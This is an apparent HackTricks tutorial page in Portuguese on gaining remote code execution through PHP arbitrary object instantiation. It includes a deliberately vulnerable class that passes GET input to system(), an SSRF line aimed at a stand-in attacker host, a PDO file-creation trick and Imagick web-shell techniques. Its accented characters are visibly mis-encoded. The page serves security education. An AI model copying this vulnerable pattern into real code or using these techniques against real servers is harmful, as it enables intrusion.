# PHP - RCE abusando da cria√ß√£o de objetos: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

Este √© basicamente um resumo de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introdu√ß√£o

A cria√ß√£o de novos objetos arbitr√°rios, como `new $_GET["a"]($_GET["a"])`, pode levar √† Execu√ß√£o Remota de C√≥digo (RCE), conforme detalhado em um [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Este documento destaca v√°rias estrat√©gias para alcan√ßar RCE.

## RCE via Classes Personalizadas ou Carregamento Autom√°tico

A sintaxe `new $a($b)` √© usada para instanciar um objeto onde **`$a`** representa o nome da classe e **`$b`** √© o primeiro argumento passado para o construtor. Essas vari√°veis podem ser provenientes de entradas do usu√°rio como GET/POST, onde podem ser strings ou arrays, ou de JSON, onde podem se apresentar como outros tipos.

Considere o trecho de c√≥digo abaixo:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Neste caso, definir `$a` como `App` ou `App2` e `$b` como um comando de sistema (por exemplo, `uname -a`) resulta na execu√ß√£o desse comando.

As **fun√ß√µes de carregamento autom√°tico** podem ser exploradas se nenhuma dessas classes for acess√≠vel diretamente. Essas fun√ß√µes carregam automaticamente classes de arquivos quando necess√°rio e s√£o definidas usando `spl_autoload_register` ou `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
O comportamento do carregamento autom√°tico varia com as vers√µes do PHP, oferecendo diferentes possibilidades de RCE.

## RCE via Classes Internas

A falta de classes personalizadas ou autoloaders pode ser suficiente para RCE. O n√∫mero dessas classes varia entre 100 e 200, com base na vers√£o do PHP e extens√µes. Elas podem ser listadas usando `get_declared_classes()`.

Os construtores de interesse podem ser identificados por meio da API de reflex√£o, conforme mostrado no exemplo a seguir e no link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via m√©todos espec√≠ficos inclui:**

### **SSRF + Desserializa√ß√£o Phar**

A classe `SplFileObject` permite SSRF por meio de seu construtor, permitindo conex√µes com qualquer URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF pode levar a ataques de desserializa√ß√£o em vers√µes do PHP anteriores a 8.0 usando o protocolo Phar.

### **Explorando PDOs**

O construtor da classe PDO permite conex√µes a bancos de dados via strings DSN, potencialmente permitindo a cria√ß√£o de arquivos ou outras intera√ß√µes:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Vers√µes do PHP at√© 5.3.22 e 5.4.12 eram suscet√≠veis a ataques XXE atrav√©s dos construtores `SoapClient` e `SimpleXMLElement`, dependendo da vers√£o do libxml2.

## RCE via Extens√£o Imagick

Na an√°lise das **depend√™ncias de um projeto**, foi descoberto que o **Imagick** poderia ser utilizado para **execu√ß√£o de comandos** ao instanciar novos objetos. Isso apresenta uma oportunidade para explorar vulnerabilidades.

### Analisador VID

A capacidade do analisador VID de escrever conte√∫do em qualquer caminho especificado no sistema de arquivos foi identificada. Isso poderia resultar na coloca√ß√£o de um shell PHP em um diret√≥rio acess√≠vel via web, alcan√ßando a Execu√ß√£o Remota de C√≥digo (RCE).

#### Analisador VID + Upload de Arquivo

Observa-se que o PHP armazena temporariamente arquivos enviados em `/tmp/phpXXXXXX`. O analisador VID no Imagick, utilizando o protocolo **msl**, pode lidar com curingas em caminhos de arquivos, facilitando a transfer√™ncia do arquivo tempor√°rio para um local escolhido. Este m√©todo oferece uma abordagem adicional para realizar a escrita de arquivos arbitr√°rios no sistema de arquivos.

### PHP Crash + For√ßa Bruta

Um m√©todo descrito no [**artigo original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) envolve o envio de arquivos que causam uma falha no servidor antes da exclus√£o. Ao for√ßar o nome do arquivo tempor√°rio, torna-se poss√≠vel para o Imagick executar c√≥digo PHP arbitr√°rio. No entanto, essa t√©cnica foi considerada eficaz apenas em uma vers√£o desatualizada do ImageMagick.

## Refer√™ncias

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
